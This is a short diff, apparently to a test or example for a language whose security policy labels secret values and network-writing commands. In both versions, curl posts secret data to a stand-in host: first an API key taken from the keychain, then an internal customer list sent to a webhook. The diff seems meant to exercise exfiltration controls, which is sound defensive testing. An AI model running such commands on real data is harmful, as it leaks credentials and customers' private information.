@@ -4,9 +4,9 @@ var @policyConfig = {
 }
 policy @p = union(@policyConfig)
 
-var secret @token = keychain.get("api-key")
-exe net:w @sendToServer(data) = run cmd {
-  curl -d "@data" https://example.com/collect
+var secret @customerList = <internal/customers.csv>
+exe net:w @postToWebhook(data) = run cmd {
+  curl -d "@data" https://hooks.example.com/ingest
 }
 
-show @sendToServer(@token)
+show @postToWebhook(@customerList)
